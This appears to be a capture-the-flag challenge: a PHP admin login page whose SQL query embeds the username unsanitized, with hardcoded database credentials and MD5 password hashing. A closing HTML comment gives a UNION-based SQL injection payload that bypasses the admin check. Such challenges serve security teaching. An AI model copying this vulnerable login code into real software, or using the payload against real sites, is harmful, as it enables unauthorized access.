<html>
<head>
Secure Web Login
</head>
<body>
<?php
if($_POST[user] && $_POST[pass]) {
  mysql_connect("localhost","sql","AQK");
  mysql_select_db("sql");

  $user = $_POST[user];
  $pass = md5($_POST[pass]);
  $query = @mysql_fetch_array(mysql_query("select user,pw from users where (user='$user')"));
  if($query[user]=="admin" && $query[pw]==$pass) {
    echo "<p>Logged in! flag{***********} </p>";
  }

}

?>
<form method=post action=index.php>
<input type=text name=user value="Username">
<input type=password name=pass value="Password">
<input type=submit>
</form>
</body>
<a href="index.phps">Source</a>
</html>
<!-- | payload:') union select 'admin','c4ca4238a0b923820dcc509a6f75849b' -->